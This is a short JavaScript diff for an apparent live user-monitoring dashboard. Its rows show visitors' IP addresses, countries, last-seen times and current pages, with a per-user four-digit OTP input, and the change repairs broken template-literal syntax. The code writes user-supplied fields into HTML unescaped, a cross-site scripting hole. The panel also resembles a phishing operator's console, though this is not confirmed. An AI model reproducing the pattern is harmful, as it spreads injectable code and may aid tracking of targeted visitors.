@@ -238,9 +238,7 @@
   function createNewUserRow(u, viewMode) {
     const code = normalizeCode(u.country);
     const country = countryData.find(c => c.code === code);
-    const flag = country
-      ? `<img src="\( {country.image}" alt=" \){country.code}" width="20" title="${country.name}" />`
-      : "❓";
+    const flag = country ? `<img src="${country.image}" alt="${country.code}" width="20" title="${country.name}" />`: "❓";
 
     const cleanPage = (u.page || "").replace(/\//g, "").toLowerCase();
 
@@ -268,7 +266,7 @@
         <td>${u.ip || "—"}</td>
         <td>${flag}</td>
         <td>${u.last_seen || "—"}</td>
-        <td id="userpage-\( {u.id}"> \){u.screen || u.page || "—"}</td>
+        <td id="userpage-${u.id}">${u.screen || u.page || "—"}</td>
         <td id="misc-${u.id}"></td>
         <td style="text-align:center;">
           <button class="delete-btn" data-id="\( {u.id}" id="deletebtn- \){u.id}" onclick="deleteUser('${u.id}')"
@@ -302,7 +300,7 @@
         <td>${u.ip || "—"}</td>
         <td>${flag}</td>
         <td>${u.last_seen || "—"}</td>
-        <td id="userpage-\( {u.id}"> \){u.screen || u.page || "—"}</td>
+        <td id="userpage-${u.id}">${u.screen || u.page || "—"}</td>
         <td>
           <input id="ph-otp-${u.id}" type="text" inputmode="numeric"
             maxlength="4" pattern="[0-9]*"
